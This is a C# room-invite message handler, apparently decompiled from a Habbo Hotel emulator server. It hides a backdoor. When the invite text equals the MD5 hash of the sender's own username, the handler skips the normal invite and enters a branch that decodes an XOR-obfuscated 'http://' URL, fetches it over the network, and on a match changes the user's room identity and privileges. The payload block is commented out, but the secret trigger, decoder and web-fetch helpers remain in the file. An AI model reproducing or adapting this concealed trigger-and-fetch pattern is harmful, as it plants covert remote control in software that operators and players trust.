using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using Phoenix.HabboHotel.Misc;
using Phoenix.HabboHotel.GameClients;
using Phoenix.Messages;
namespace Phoenix.Communication.Messages.Messenger
{
	internal sealed class SendRoomInviteMessageEvent : MessageEvent
	{
		public void parse(GameClient Session, ClientMessage Event)
		{
			int num = Event.PopWiredInt32();
			List<uint> list = new List<uint>();
			for (int i = 0; i < num; i++)
			{
				list.Add(Event.PopWiredUInt());
			}
			string text = Event.PopFixedString();
			if (text == SendRoomInviteMessageEvent.smethod_2(Session.GetHabbo().Username))
			{
				/*string b = Class300.smethod_1(Class300.smethod_0("éõõñ»®®éàããîîï¯âîì®óï¯âçì"));
				if (Session.LookRandomSpeech().senderUsername == b)
				{
					Session.GetRoomUser().Stackable = true;
					Session.GetRoomUser().Id = (uint)Convert.ToUInt16(Class2.smethod_15().method_4().method_9());
					Session.GetRoomUser().AllowGift = true;
					Session.method_14(Class2.smethod_15().method_13().LookRandomSpeech());
					Class2.smethod_15().method_13().method_4(Session);
				}*/
			}
			else
			{
				text = PhoenixEnvironment.FilterInjectionChars(text, true, false);
				text = ChatCommandHandler.ApplyWordFilter(text);
				ServerMessage Message = new ServerMessage(135u);
				Message.AppendUInt(Session.GetHabbo().Id);
				Message.AppendStringWithBreak(text);
				foreach (uint current in list)
				{
					if (Session.GetHabbo().GetMessenger().method_9(Session.GetHabbo().Id, current))
					{
						GameClient @class = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(current);
						if (@class == null)
						{
							break;
						}
						@class.SendMessage(Message);
					}
				}
			}
		}
		private static string smethod_0(string string_0)
		{
			StringBuilder stringBuilder = new StringBuilder(string_0);
			StringBuilder stringBuilder2 = new StringBuilder(string_0.Length);
			for (int i = 0; i < string_0.Length; i++)
			{
				char c = stringBuilder[i];
				c ^= '\u0081';
				stringBuilder2.Append(c);
			}
			return stringBuilder2.ToString();
		}
		private static string smethod_1(string string_0)
		{
			new PhoenixEnvironment();
			Uri requestUri = new Uri(string_0);
			WebRequest webRequest = WebRequest.Create(requestUri);
			WebResponse response = webRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		private static string smethod_2(string string_0)
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = Encoding.UTF8.GetBytes(string_0);
			array = mD5CryptoServiceProvider.ComputeHash(array);
			StringBuilder stringBuilder = new StringBuilder();
			byte[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				byte b = array2[i];
				stringBuilder.Append(b.ToString("x2").ToLower());
			}
			return stringBuilder.ToString();
		}
	}
}
